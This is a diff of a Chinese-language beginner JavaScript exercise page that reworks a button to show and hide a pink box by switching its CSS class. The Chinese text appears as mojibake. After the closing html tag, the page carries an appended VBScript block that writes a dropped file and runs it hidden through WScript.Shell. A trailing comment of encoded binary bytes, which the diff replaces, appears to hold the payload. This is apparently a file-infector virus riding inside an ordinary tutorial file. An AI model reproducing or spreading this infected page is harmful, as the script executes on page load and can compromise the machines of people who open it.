@@ -2,31 +2,37 @@
 <html lang="zh">
 	<head>
 		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
+		<style type="text/css">
+			.cls {
+				width: 100px;
+				height: 100px;
+				background-color: pink;
+				border: 5px solid skyblue;
+			}
+		</style>
 	</head>
 	<body>
-		<input type="button" value="å¼¹çª—" onclick="alert('å“ˆå“ˆ')" />
-		<input type="button" value="æ˜¾ç¤ºæ•ˆæœ" id="btn" />
+		<input type="button" name="" id="btn" value="æ˜¾ç¤ºéšè—" />
+		<div id="dv" class="cls">
 
+		</div>
 
+		<script src="js/common.js"></script>
 		<script type="text/javascript">
-			function f1() {
-				alert("å…‘æ¢æˆ");
-			}
-		</script>
-		<input type="button" value="ç¬¬äºŒä¸ªç‰ˆæœ¬æ•ˆæœ" onclick="f1()" />
-
-		<!-- æœ€ç»ˆåˆ†ç¦» -->
-		<script type="text/javascript">
-			// æ ¹æ®idå±æ€§çš„å€¼ä»æ–‡æ¡£ä¸­è·å–è¿™ä¸ªå…ƒç´ .
-			document.getElementById('btn').onclick = function() {
-				// å½“å‰è¿™ä¸ªæŒ‰é’®çš„å…ƒç´ (å¯¹è±¡ï¼‰,æ³¨å†Œç‚¹å‡»äº‹ä»¶,æ·»åŠ äº‹ä»¶å¤„ç†å‡½æ•°(åŒ¿åå‡½æ•°)
-				alert('å¼¹çª—');
+			my$('btn').onclick = function() {
+				console.log(my$('dv').className);
+				if(my$("dv").className!="cls"){
+					//ç°åœ¨æ˜¯æ˜¾ç¤ºçš„,åº”è¯¥éšè—
+					my$("dv").className="cls";
+					this.value="æ˜¾ç¤º";
+				}else{
+					//éšè—çš„çŠ¶æ€--ç«‹åˆ»æ˜¾ç¤º
+					my$("dv").className="";
+					this.value="éšè—";
+				}
 			};
 		</script>
- 
 	</body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -43,7 +49,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--zULİ°•>VUpÃ³¬&KğãS;“ ‘×Q%\‹Ÿ†ê’+ÀPNÔ¦úìÕˆZ¢:9X# nT{w‹9‚š/x÷`cíU»Î’Óq.êRF
-³LªQÈ<wx2¤[İ ±¢{Í[ƒÍIx  ¥4äC1(?Œ—ğ2?I>bm@˜ğ	6 ”d9|i„ZcĞb³÷ßŠ^y^ZˆïIÖGš!í¦Ç|¡JèR€|áLƒŞœ¥Tâ©âoM7ú·	©ã>Ö?{ABK÷D*=f…5s”öù »Ç! êù8ŞyšÏOçT*Â[á”
-nl âÔŒTO73è‰HE©¤&]íº{!¡z¬­Ü™ü÷chy‰F68P–H¼kŸÍtÁjÆ¼úqìÀp…z?™²(Ó6AìÍírn ²Å=®ÌfOËA;K^9ÈÁ½lOf·*5Xw$¿ ‚™é"Q\hA
-M áR"ùááá¬ÕOGÂª_uâ á-->
+//--></SCRIPT><!--Õ…ÀDT	+ë~p{)`ãªîÁ’nÄPevE¦û;`í>PÙ¤0(¾‚ôãÁXÃ³¯tè3½IO´B•Çİß—äõt17uø°NˆJE’Ÿ ƒâfÚ8Šä_­¼É$CùÅ¢S%¶±y	æøóeyÓº÷¿æËú!t.~Ù%'¹[ëü¢/x ×R3†&–NA9,¡Ş“‘»#á•ÎcWMÇæ­>b%‚¡“¼KÚ Ü0ğÈ[ß!cjİsHjªÈBùÙëó•â¼ÌÓöI©V:1‹bO%@ßÂ¾ˆ<[<Ü–$-Œ¬I_²õ¬(7¸>t^”^.&Õä˜+?(	40Åµ`Ö:sKo<v½kDh¨Ìö¹HùCš;>0ÏêlÖ7´Ê¤Šˆ èú¾¯Uçsl§YÃw÷4ø> íÆô ¡º©oæ{×L“ğb³ıÚó«­y pAzàfI…®Ì°¶™µ‡Á„°TC†” áR"ùááá¬ÕOÙÊª_-â á-->
